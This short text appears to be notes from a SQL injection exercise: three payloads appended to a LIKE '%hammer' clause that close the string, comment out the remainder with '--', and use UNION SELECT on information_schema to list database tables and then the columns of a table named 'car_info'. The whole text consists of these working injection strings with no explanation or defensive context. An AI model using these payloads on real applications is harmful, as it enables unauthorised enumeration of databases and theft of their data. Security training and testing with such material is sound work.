LIKE '%hammer';-- %';

LIKE '%hammer' UNION (SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables);-- %';

LIKE '%hammer' UNION (SELECT COLUMN_NAME,2 FROM information_schema.columns WHERE TABLE_NAME='car_info');-- %';